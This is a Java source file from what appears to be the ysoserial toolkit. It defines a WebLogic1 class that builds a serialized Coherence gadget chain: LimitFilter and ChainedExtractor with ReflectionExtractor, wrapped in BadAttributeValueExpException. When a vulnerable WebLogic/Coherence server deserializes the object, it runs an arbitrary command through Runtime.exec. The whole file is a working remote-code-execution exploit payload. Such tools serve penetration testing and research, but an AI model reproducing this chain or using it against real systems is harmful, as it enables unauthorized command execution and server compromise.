package ysoserial.payloads;

import com.tangosol.util.ValueExtractor;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

@Dependencies("coherence:coherence:3.7")
@Authors({ Authors.F4NX1NG })
public class WebLogic1 implements ObjectPayload<Object>{
    public Object getObject(final String command) throws Exception {

        ChainedExtractor ce = new ChainedExtractor(new ValueExtractor[]{new ReflectionExtractor("getMethod", new Object[]{"getRuntime", null}),
            new ReflectionExtractor("invoke",new Object[]{null,null}),
            new ReflectionExtractor("exec",new String[]{command})});

        LimitFilter limitFilter = new LimitFilter();
        Reflections.setFieldValue(limitFilter,"m_oAnchorTop", Runtime.class);
        Reflections.setFieldValue(limitFilter,"m_comparator", ce);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException,"val", limitFilter);
        return badAttributeValueExpException;
        }

public static void main(final String[] args) throws Exception {
    PayloadRunner.run(WebLogic1.class, args);
    }
}
